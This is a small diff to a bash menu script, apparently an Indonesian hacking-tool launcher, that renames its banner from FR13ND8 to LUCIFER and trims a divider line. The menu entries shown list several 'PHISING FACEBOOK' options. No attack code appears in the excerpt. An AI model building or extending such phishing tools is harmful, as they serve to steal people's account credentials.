@@ -40,9 +40,9 @@ echo $i"|"$me"16"$i" |"$cy" PHISING FACEBOOK 3       "$i"|"
 echo $i"|"$me"17"$i" |"$cy" PHISING FACEBOOK 4       "$i"|"
 echo $i"|"$me"18"$i" |"$cy" INSTALL BAHAN DULU COEG  "$i"|"
 echo $i"|"$me"19"$i" |"$cy" KELUAR/EXIT PROGRAM      "$i"|"
-echo $i"────────────────────────────────    ─────"
+echo $i"────────────────────────────────"
 echo
-echo $me"┌==="$bi"["$i"FR13ND8"$bi"]"$me"======"$bi"["$i""Pilih Nomornya""$bi"]"
+echo $me"┌==="$bi"["$i"LUCIFER"$bi"]"$me"======"$bi"["$i""Pilih Nomornya""$bi"]"
 echo $me"¦"
 read -p"└──# " pil
 
